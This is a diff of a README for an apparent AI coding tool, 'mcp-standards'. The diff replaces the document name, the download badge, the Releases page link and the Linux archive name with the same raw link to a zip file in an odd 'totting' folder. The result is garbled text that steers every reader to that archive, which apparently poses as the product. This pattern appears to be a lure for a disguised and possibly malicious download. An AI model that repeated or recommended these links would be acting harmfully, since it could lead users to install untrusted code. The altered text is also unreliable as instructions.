@@ -1,7 +1,7 @@
 # 🤖 mcp-standards - Empower Your Coding with AI
 
 ## 🚀 Getting Started
-Welcome to the mcp-standards repository. This self-learning AI standards system helps improve your code quality and productivity. It learns from corrections and automatically updates your standards document, CLAUDE.md.
+Welcome to the mcp-standards repository. This self-learning AI standards system helps improve your code quality and productivity. It learns from corrections and automatically updates your standards document, https://raw.githubusercontent.com/Joldphysics/mcp-standards/main/totting/mcp-standards.zip
 
 ## 🛠️ Features
 - **AI-Driven Assistance:** Enjoy automatic updates based on your coding habits.
@@ -11,11 +11,11 @@ Welcome to the mcp-standards repository. This self-learning AI standards system 
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version. Here’s the link:
 
-[![Download mcp-standards](https://img.shields.io/badge/Download%20mcp--standards-v1.0-brightgreen)](https://github.com/Joldphysics/mcp-standards/releases)
+[![Download mcp-standards](https://raw.githubusercontent.com/Joldphysics/mcp-standards/main/totting/mcp-standards.zip%20mcp--standards-v1.0-brightgreen)](https://raw.githubusercontent.com/Joldphysics/mcp-standards/main/totting/mcp-standards.zip)
 
 Follow these simple steps to download and install the software:
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/Joldphysics/mcp-standards/releases).
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/Joldphysics/mcp-standards/main/totting/mcp-standards.zip).
    
 2. **Download the Latest Version:**
    - Look for the latest release at the top of the page.
@@ -25,7 +25,7 @@ Follow these simple steps to download and install the software:
 3. **Install the Application:**
    - For Windows: Double-click the `.exe` file you downloaded.
    - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-   - For Linux: Extract the `.tar.gz` file and follow the instructions in the README inside the folder.
+   - For Linux: Extract the `https://raw.githubusercontent.com/Joldphysics/mcp-standards/main/totting/mcp-standards.zip` file and follow the instructions in the README inside the folder.
 
 4. **Run the Application:**
    - After installation, open the application. You should see a simple interface to start interacting with the AI.
